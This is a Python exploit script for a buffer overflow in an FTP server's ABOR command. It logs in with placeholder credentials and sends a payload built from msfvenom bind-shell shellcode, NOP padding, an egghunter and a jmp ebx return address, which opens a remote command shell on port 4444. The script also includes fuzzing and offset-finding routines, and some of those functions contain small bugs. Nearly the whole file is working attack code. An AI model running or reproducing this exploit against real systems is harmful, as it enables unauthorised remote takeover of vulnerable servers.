#!/usr/bin/env python

import sys, os, time
import socket

s = None
def connect(ip, port):
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "[+] Connecting to server"
    s.connect((ip, port))
    print s.recv(1024)
    time.sleep(3)

def exploit(ip, port):
    #exploit = shellcode + nopnop + egghuntercode + jmp ebx address + normalnop as padding
    global s  
    #commnd that generated the shell
    #bad chars are \x00 \x0a \x0d \xff
    #msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c -b '\x00\x0a\x0d\xff'
    shellcode = ("w00tw00t" + 
	"\xdb\xcc\xd9\x74\x24\xf4\xba\x73\x98\x58\x99\x5e\x33\xc9\xb1"
	"\x53\x31\x56\x17\x83\xee\xfc\x03\x25\x8b\xba\x6c\x35\x43\xb8"
	"\x8f\xc5\x94\xdd\x06\x20\xa5\xdd\x7d\x21\x96\xed\xf6\x67\x1b"
	"\x85\x5b\x93\xa8\xeb\x73\x94\x19\x41\xa2\x9b\x9a\xfa\x96\xba"
	"\x18\x01\xcb\x1c\x20\xca\x1e\x5d\x65\x37\xd2\x0f\x3e\x33\x41"
	"\xbf\x4b\x09\x5a\x34\x07\x9f\xda\xa9\xd0\x9e\xcb\x7c\x6a\xf9"
	"\xcb\x7f\xbf\x71\x42\x67\xdc\xbc\x1c\x1c\x16\x4a\x9f\xf4\x66"
	"\xb3\x0c\x39\x47\x46\x4c\x7e\x60\xb9\x3b\x76\x92\x44\x3c\x4d"
	"\xe8\x92\xc9\x55\x4a\x50\x69\xb1\x6a\xb5\xec\x32\x60\x72\x7a"
	"\x1c\x65\x85\xaf\x17\x91\x0e\x4e\xf7\x13\x54\x75\xd3\x78\x0e"
	"\x14\x42\x25\xe1\x29\x94\x86\x5e\x8c\xdf\x2b\x8a\xbd\x82\x23"
	"\x7f\x8c\x3c\xb4\x17\x87\x4f\x86\xb8\x33\xc7\xaa\x31\x9a\x10"
	"\xcc\x6b\x5a\x8e\x33\x94\x9b\x87\xf7\xc0\xcb\xbf\xde\x68\x80"
	"\x3f\xde\xbc\x3d\x37\x79\x6f\x20\xba\x39\xdf\xe4\x14\xd2\x35"
	"\xeb\x4b\xc2\x35\x21\xe4\x6b\xc8\xca\x1b\x30\x45\x2c\x71\xd8"
	"\x03\xe6\xed\x1a\x70\x3f\x8a\x65\x52\x17\x3c\x2d\xb4\xa0\x43"
	"\xae\x92\x86\xd3\x25\xf1\x12\xc2\x39\xdc\x32\x93\xae\xaa\xd2"
	"\xd6\x4f\xaa\xfe\x80\xec\x39\x65\x50\x7a\x22\x32\x07\x2b\x94"
	"\x4b\xcd\xc1\x8f\xe5\xf3\x1b\x49\xcd\xb7\xc7\xaa\xd0\x36\x85"
	"\x97\xf6\x28\x53\x17\xb3\x1c\x0b\x4e\x6d\xca\xed\x38\xdf\xa4"
	"\xa7\x97\x89\x20\x31\xd4\x09\x36\x3e\x31\xfc\xd6\x8f\xec\xb9"
	"\xe9\x20\x79\x4e\x92\x5c\x19\xb1\x49\xe5\x29\xf8\xd3\x4c\xa2"
	"\xa5\x86\xcc\xaf\x55\x7d\x12\xd6\xd5\x77\xeb\x2d\xc5\xf2\xee"
	"\x6a\x41\xef\x82\xe3\x24\x0f\x30\x03\x6d")
    #!mona egg -t w00t
    egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
                     "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
    #jmp ebx in kernel.dll 7c873c53
    eip = "\x53\x3C\x87\x7C" 
    #jmp ebx in SHELL32.dll 7C B2 02 AD
    eip = "\xAD\x02\xB2\x7C" 
    nopnop = (1099 - len(shellcode) - len(egghunter)) * '\x90'
    noppad = 205 * '\x90'

    exploit = shellcode + nopnop + egghunter + eip +noppad    

    connect(ip, port)

    #Banner comes at this point
    print s.recv(1024)
    #send username
    s.send("USER " + "hacker" + "\r\n")
    #Status
    print s.recv(1024)
    #Send password
    s.send("PASS " + "hacker" + "\r\n")
    print s.recv(1024)
    #send payload that makes buffer overflow 
    s.send("ABOR "+ exploit + "\r\n")

    disconnect()

def offset(ip, port):
    global s

    connect()

    with open("offset.txt", "rb") as fd:
        payload = fd.read(2000)

    s.connect((ip, port))
    print s.recv(1024)
    time.sleep(3)
    #Banner comes at this point
    print s.recv(1024)
    #send username
    s.send("USER " + "hacker" + "\r\n")
    #Status
    print s.recv(1024)
    #Send password
    s.send("PASS " + "hacker" + "\r\n")
    print s.recv(1024)
    #send payload that makes buffer overflow 
    s.send("ABOR "+ payload + "\r\n")
    disconnect()

def fuzzer(ip, port):
    global s
    connect()


    payload = 1500 * '\x42' 

    s.connect((ip, port))
    print s.recv(1024)
    time.sleep(1)
    #Banner comes at this point

    s.recv(2000)
    #send username
    s.send("USER " + "hacker" + "\r\n")
    #s.send("USER " + payload + "\r\n")
    #Status
    s.recv(2000)
    #Send password
    s.send("PASS " + "hacker" + "\r\n")
    #s.send("PASS " + payload + "\r\n")
    s.recv(2000)
    #send payload that makes buffer overflow 
    s.send("ABOR "+ payload + "\r\n")
    disconnect()    


def disconnect():
    global s
    s.close()


exploit(sys.argv[1], 21)
